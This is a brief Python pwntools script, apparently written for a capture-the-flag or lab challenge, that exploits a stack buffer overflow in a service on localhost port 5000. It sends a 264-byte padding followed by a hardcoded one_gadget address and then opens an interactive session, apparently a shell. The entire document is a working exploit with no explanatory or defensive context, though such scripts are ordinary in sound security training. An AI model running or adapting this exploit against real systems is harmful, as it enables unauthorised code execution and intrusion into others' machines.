from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 264
one_gadget = 0x7ffff7e9a4ce

def start():
    return remote('localhost', 5000)

io = start()
payload = b"A" * offset + p64(one_gadget)
io.send(payload)
io.interactive()
